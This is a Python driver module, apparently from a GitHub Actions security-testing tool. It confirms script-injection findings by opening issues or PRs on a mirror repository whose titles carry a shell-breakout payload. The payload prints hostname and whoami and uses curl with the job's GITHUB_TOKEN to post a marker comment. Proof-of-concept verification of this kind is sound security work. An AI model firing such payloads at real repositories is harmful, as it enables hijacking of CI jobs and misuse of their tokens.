"""Driver for `script-injection` findings.

Injects an untrusted-input payload that echoes the marker AND performs an
out-of-band GITHUB_TOKEN-authored side effect (posting a comment), so we
can prove `command_injection` — a shell metacharacter broke the intended
string context.

Trigger routing:
- `issues` / `issue_comment` → open an issue on the mirror whose title
  or body contains the payload. No fork needed.
- `pull_request` / `pull_request_target` → fork the mirror and open a
  PR whose title / body carries the payload.
"""
from __future__ import annotations

from typing import Any

from .base import (
    Driver,
    DriverPreviewInfo,
    PayloadArtifact,
    SignalSpec,
    TriggerPlan,
    register,
)


_MARKER_ECHO = 'echo GRAFTER_MARKER_{marker}'
# We break the shell context with `; ...; #` and echo the marker, then run
# a harmless side effect: post a comment on the very PR/issue that
# triggered us, using the base-repo GITHUB_TOKEN available in $GITHUB_TOKEN.
# The comment body includes the marker so the watcher can attribute it.
_PAYLOAD_TEMPLATE = (
    'x"; '
    'echo GRAFTER_MARKER_{marker}; '
    'echo "hostname=$(hostname 2>/dev/null||true) whoami=$(whoami 2>/dev/null||true) uuid={marker}"; '
    'curl -sS -X POST -H "Authorization: Bearer $GITHUB_TOKEN" '
    '-H "Accept: application/vnd.github+json" '
    '"$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/issues/$ISSUE_OR_PR_NUMBER/comments" '
    '-d "{{\\"body\\":\\"grafter-poc side-effect GRAFTER_SIDE_EFFECT_{marker}\\"}}" '
    '2>/dev/null || true; '
    'echo "#'
)


def _pr_or_issue_payload(marker: str) -> str:
    return _PAYLOAD_TEMPLATE.format(marker=marker)


class ScriptInjectionDriver(Driver):
    category = "script-injection"
    default_impact_tags = ["command_injection", "rce"]
    supports_real_repo_mode = False

    def preview(self, finding: dict, marker: str) -> DriverPreviewInfo:
        trigger = (finding or {}).get("trigger") or ""
        tainted = (finding or {}).get("tainted_expression") or "github.event.pull_request.title"
        sink = (finding or {}).get("detected_sink_line") or "run: echo …"

        run_log_marker = SignalSpec(
            id="marker_in_log",
            signal_type="run_log_regex",
            tags=["command_injection"],
            description=f"workflow run log contains `GRAFTER_MARKER_{marker}`",
            params={"regex": f"GRAFTER_MARKER_{marker}"},
        )
        side_effect_signal = SignalSpec(
            id="side_effect_comment",
            signal_type="issue_or_pr_comment_regex",
            tags=["command_injection", "rce"],
            description=(
                "the base repo GITHUB_TOKEN posted a comment starting with "
                f"`grafter-poc side-effect GRAFTER_SIDE_EFFECT_{marker}` "
                "(proves a second, attacker-chosen action ran inside the shell context)"
            ),
            params={"regex": f"GRAFTER_SIDE_EFFECT_{marker}"},
        )
        payload_summary = (
            f"Inject shell breakout via `{tainted}`; the vulnerable `run:` "
            f"reaches `{sink[:120]}` and executes: echo marker, print "
            "hostname/whoami/uuid, and post a comment via `$GITHUB_TOKEN`."
        )
        return DriverPreviewInfo(
            claim=(
                f"An untrusted value passed via `${{{{ {tainted} }}}}` in "
                f"{finding.get('workflow_path')} can break out of the "
                "intended string context and run attacker-chosen shell in the "
                "workflow's job, including calls back to the GitHub API using "
                "the job's `GITHUB_TOKEN`."
            ),
            impact_tags=list(self.default_impact_tags),
            signals=[run_log_marker, side_effect_signal],
            success_requirement="marker_in_log AND side_effect_comment",
            payload_summary=payload_summary,
            supports_real_repo_mode=False,
        )

    def build_payload(self, finding: dict, marker: str) -> PayloadArtifact:
        # Script-injection needs no attacker branch payload — the payload
        # lives in the issue/PR title/body. Return an empty artifact.
        return PayloadArtifact(files=[], commit_message="")

    def build_trigger(self, finding: dict, marker: str) -> TriggerPlan:
        trigger = (finding or {}).get("trigger") or ""
        payload = _pr_or_issue_payload(marker)
        if trigger in ("issues",):
            return TriggerPlan(
                kind="issue",
                title=payload,
                body=(
                    "PoC issue (Grafter Live PoC). This body is intentionally "
                    "innocuous; the payload lives in the title."
                ),
            )
        if trigger in ("issue_comment",):
            return TriggerPlan(
                kind="issue_comment",
                # We open a placeholder issue first, then add a comment. The
                # orchestrator sees `issue_comment` and does the two-step.
                title="grafter-poc placeholder issue",
                body="grafter-poc placeholder — comment will follow",
                comment_body=payload,
            )
        # PR-shaped triggers.
        return TriggerPlan(
            kind="pr",
            branch=f"grafter-poc-{marker}",
            base_branch="main",  # orchestrator overrides with mirror default branch
            title=payload,
            body=(
                "Grafter Live PoC — attacker-controlled PR title carries the "
                "injection payload. This PR does not modify code."
            ),
        )


register(ScriptInjectionDriver())
